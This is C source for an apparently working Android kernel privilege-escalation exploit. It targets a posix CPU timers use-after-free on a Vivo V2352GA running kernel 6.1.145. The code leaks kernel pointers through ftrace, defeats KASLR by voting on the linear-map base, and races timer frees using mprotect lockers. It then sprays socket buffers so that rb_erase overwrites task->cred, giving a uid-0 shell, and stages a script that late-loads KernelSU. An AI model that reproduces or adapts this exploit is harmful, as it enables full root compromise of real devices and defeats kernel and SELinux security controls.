/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 * Target : Vivo V2352GA (PD2352), OriginOS 6 / Android 16
 * Kernel : 6.1.145-android14-11-maybe-dirty
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Backport to 6.1.145 V2352GA from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * Offsets verified from Image (0x1a2c30, 0xae0ac) + BTF (cred 0xB0, task 0x838, TP 0x40).
 * The trigger, slab layout and offsets are the same; the do_timer_create
 * call site and the tracefs event ids are per-build and are re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob. The worker runs the selected manager's staged ksud payload to
 *     late-load the matching module for the configured KMI.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node.  A plant that failed before the
 * node could be controlled is reaped and retried; a node that cannot be
 * reaped safely is held as a zombie, so a run may park and need a reboot.
 * Every successful plant still leaves one stale node and therefore one
 * timerqueue_del WARN, so the plant count is kept at the minimum.  Event ids
 * and the linear-map base are discovered at runtime; the tracefs metadata
 * files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <dirent.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192

/* Per-build target values; build-timer.cmd selects target-<release>.h. */
#include "target.h"

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static char g_helper_name[16];
static const char *g_completion_path;
static int g_run_finished;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);
static long now_ms(void);

/*
 * Write the child's report back to the parent and report a failure.
 *
 * `SIGPIPE` is ignored, so a broken pipe surfaces as EPIPE here instead of
 * killing the child.  That used to be invisible: the write was `(void)`, the
 * child exited 0, and the parent only logged "child report missing".  The
 * errno is printed now so the two failures ("parent closed the pipe" vs "the
 * kernel killed the writer") can be told apart from the log.
 */
static int send_report(const void *buf, size_t len, const char *what)
{
    size_t off = 0;

    while (off < len)
    {
        ssize_t n = write(4, (const char *)buf + off, len - off);

        if (n < 0)
        {
            if (errno == EINTR)
                continue;
            logf("[-] child %s write failed off=%zu errno=%d\n", what, off, errno);
            return -1;
        }
        if (n == 0)
        {
            logf("[-] child %s write stalled off=%zu\n", what, off);
            return -1;
        }
        off += (size_t)n;
    }
    return 0;
}

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:kmem_cache_alloc_node\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

/*
 * The task cache is sized from arch_task_struct_size, which a vendor may
 * extend past the BTF struct size, so accept the whole
 * [TASK_ALLOC_BYTES, TASK_ALLOC_MAX] window the profile declares.
 */
static int task_alloc_size(unsigned long long v)
{
    return v >= TASK_ALLOC_BYTES && v <= TASK_ALLOC_MAX;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != COPY_PROCESS_LOW21)
            continue;
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* alloc_node has the same leading fields as alloc, so one scan
         * covers both events. */
        if (!task_alloc_size(req) && !task_alloc_size(alloc))
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

/*
 * True once the process that owns this mm is gone.
 *
 * The helpers are clone(CLONE_VM) children of the target process, so while it
 * lives getppid() is exactly g_target_tgid.  When it dies the kernel reparents
 * them to init (or a subreaper) and the comparison fails.  Without this the
 * three lockers of every finished plant keep spinning mprotect over 50,000
 * VMAs, which is what starved the child after a successful run.
 */
static int target_gone(void)
{
    int want = atomic_load(&g_target_tgid);

    if (want <= 0)
        return 1;
    return getppid() != (pid_t)want;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
    {
        if (target_gone())
            _exit(0);
        sched_yield();
    }
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    prctl(PR_SET_NAME, g_helper_name, 0, 0, 0);
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
    {
        if (target_gone())
            _exit(0);
        sched_yield();
    }
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

/* Spray load stretches a fixed poll count, so judge the timeout in wall time.
 * The recorded runs put the 99th percentile at 1.3 s but the maximum at 5.05 s,
 * so 8 s covers every plant that has ever completed; a shorter bound would
 * declare a healthy plant stuck and throw away a good write. */
#define ZOMBIE_TIMEOUT_MS 8000
static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    long start = now_ms();

    while (now_ms() - start < ZOMBIE_TIMEOUT_MS)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void terminate_owned_helpers(void)
{
    DIR *processes = opendir("/proc");
    struct dirent *entry;
    int killed = 0, matched = 0, scanned = 0;

    if (!processes)
    {
        logf("[!] cannot enumerate Timer helpers errno=%d\n", errno);
        return;
    }
    while ((entry = readdir(processes)))
    {
        char name[32] = {0};

        if (entry->d_name[0] < '0' || entry->d_name[0] > '9')
            continue;
        if (atoi(entry->d_name) == getpid())
            continue;
        /* The proc directory pins the process identity even if its PID is recycled. */
        int process = openat(dirfd(processes), entry->d_name, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (process < 0)
            continue;
        scanned++;
        int comm = openat(process, "comm", O_RDONLY | O_CLOEXEC);
        if (comm >= 0)
        {
            ssize_t n = read(comm, name, sizeof(name) - 1);
            close(comm);
            if (n > 0)
            {
                name[strcspn(name, "\n")] = '\0';
                if (!strcmp(name, g_helper_name))
                {
                    matched++;
                    if (syscall(SYS_pidfd_send_signal, process, SIGKILL, NULL, 0) == 0)
                        killed++;
                    else if (errno != ESRCH)
                        logf("[!] cannot kill helper pid=%s errno=%d\n", entry->d_name, errno);
                }
            }
        }
        close(process);
    }
    closedir(processes);
    /* `scanned` distinguishes "no helper was left" from "the scan failed". */
    logf("[+] Timer helper cleanup: scanned=%d matched=%d killed=%d\n",
         scanned, matched, killed);
}

static void finish_run(void)
{
    if (g_run_finished)
        return;
    g_run_finished = 1;
    terminate_owned_helpers();
    if (g_completion_path)
    {
        const unsigned char completed = 1;
        /* The app pre-creates this file and removes it on timeout. Do not recreate it. */
        int fd = open(g_completion_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
        if (fd < 0)
            logf("[!] cannot open run completion file errno=%d\n", errno);
        else
        {
            if (write(fd, &completed, sizeof(completed)) != sizeof(completed))
                logf("[!] cannot write run completion errno=%d\n", errno);
            close(fd);
        }
    }
}

/*
 * Stop the run because something failed.  This is an error: the kernel still
 * holds a stale node and the process must stay parked.
 */
static void park_forever(const char *why)
{
    finish_run();
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stop the run on purpose after it succeeded.
 *
 * The fake endgame must keep the reclaimed page mapped, so the process parks
 * with its socket buffers holding the fake cred.  That is the designed
 * behaviour, not a failure -- logging it with `[!]` made a successful root
 * look like an error.  `[*]` is the app's warning tone.
 */
static void park_expected(const char *why)
{
    finish_run();
    logf("[*] %s -- parking as designed (fake cred page held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/* Final stage: hand off to the privileged child.  Returns 0 only when the
 * whole script is on disk, so a partial write cannot be sourced later. */
static int write_ksu_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
        "PKG=$(head -n 1 /data/local/tmp/su_manager_pkg 2>/dev/null)\n"
        "if [ -z \"$PKG\" ]; then echo '[ksu] manager package missing'; exit 1; fi\n"
        "echo \"[ksu] manager pkg=$PKG\"\n"
        "KSUD=$(head -n 1 /data/local/tmp/ksud_path 2>/dev/null)\n"
        "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing for selected manager'; exit 1; fi\n"
        "ls -l \"$KSUD\" 2>&1 | head -1\n"
        "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
        "\"$KSUD\" late-load --allow-shell "
        "--package-name \"$PKG\"\n"
        "echo \"[ksu] late-load rc=$?\"\n"
        /* late-load daemonizes. Its launcher exiting does not mean init is done. */
        "ksud_running() {\n"
        "  for exe in /proc/[0-9]*/exe; do\n"
        "    [ \"$exe\" -ef \"$KSUD\" ] || continue\n"
        /* sulogd shares this executable but must not hold up late-load completion. */
        "    cmd=$(tr '\\000' '\\n' 2>/dev/null < \"${exe%/exe}/cmdline\" | sed -n '2p')\n"
        "    [ \"$cmd\" = late-load ] && return 0\n"
        "  done\n"
        "  return 1\n"
        "}\n"
        "echo '[ksu] waiting for late-load to finish'\n"
        "while ksud_running; do sleep 0.2; done\n"
        "echo '[ksu] late-load finished'\n"
        "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
        "echo \"[ksu] enforce=$(getenforce)\"\n";
    static const char path[] = "/data/local/tmp/ksu_stage.sh";
    ssize_t n;
    int fd, rc = 0;

    fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0)
        return -1;
    n = write(fd, script, sizeof(script) - 1);
    if (n != (ssize_t)(sizeof(script) - 1))
        rc = -1;
    if (close(fd))
        rc = -1;
    if (chmod(path, 0755))
        rc = -1;
    return rc;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

/*
 * Plant one write at `target` (mode 0: rb_erase writes 0; mode 2: the fake
 * cred page, whose node address is written instead).
 *
 * A retry is only allowed when the failed attempt provably left no node we do
 * not control; run_plant sets `retry` for exactly those cases.  Retrying
 * blindly plants another stale node, and each of those is one more
 * timerqueue_del WARN and one more chance to panic.
 */
static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed (not retryable)\n", what);
            return -1;
        }
        if (attempt < 3)
            logf("[-] stage %s attempt=%d failed, retrying\n", what, attempt);
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray, g_spray_done;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static int ensure_pool(void)
{
    int snd = 16 << 20;

    if (!g_pool_n)
    {
        for (int i = 0; i < SPRAY_SOCKS; i++)
        {
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
                break;
            setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
            setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
            g_pool_n++;
        }
    }
    /* Every thread needs its own writable sockets; with fewer, a thread would
     * divide by a zero/partial share and the burst would be short. */
    if (g_pool_n < SPRAY_THREADS * 32)
    {
        logf("[-] only %d spray sockets (need %d)\n", g_pool_n,
             SPRAY_THREADS * 32);
        return -1;
    }
    logf("[+] spray pool=%d sockets, %d per thread\n", g_pool_n,
         g_pool_n / SPRAY_THREADS);
    return 0;
}

